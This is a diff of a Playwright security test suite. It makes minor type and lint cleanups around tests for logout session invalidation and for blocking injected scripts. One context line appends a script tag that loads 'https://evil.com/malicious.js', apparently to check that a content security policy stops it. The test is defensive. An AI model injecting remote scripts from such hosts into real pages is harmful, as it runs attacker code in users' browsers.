@@ -244,7 +244,7 @@ test.describe('Security Tests', () => {
       await expect(page.locator('[data-testid="login-form"]')).toBeVisible();
     });
 
-    test('should invalidate session on logout', async ({ page, context }) => {
+    test('should invalidate session on logout', async ({ page }) => {
       // Login
       await page.goto('/');
       await page.fill('input[type="email"]', 'admin@example.com');
@@ -290,7 +290,7 @@ test.describe('Security Tests', () => {
           });
           return { status: response.status, ok: response.ok };
         } catch (error) {
-          return { error: error.message };
+          return { error: (error as Error).message };
         }
       });
       
@@ -323,7 +323,7 @@ test.describe('Security Tests', () => {
           script.src = 'https://evil.com/malicious.js';
           document.head.appendChild(script);
           return true;
-        } catch (error) {
+        } catch {
           return false;
         }
       });
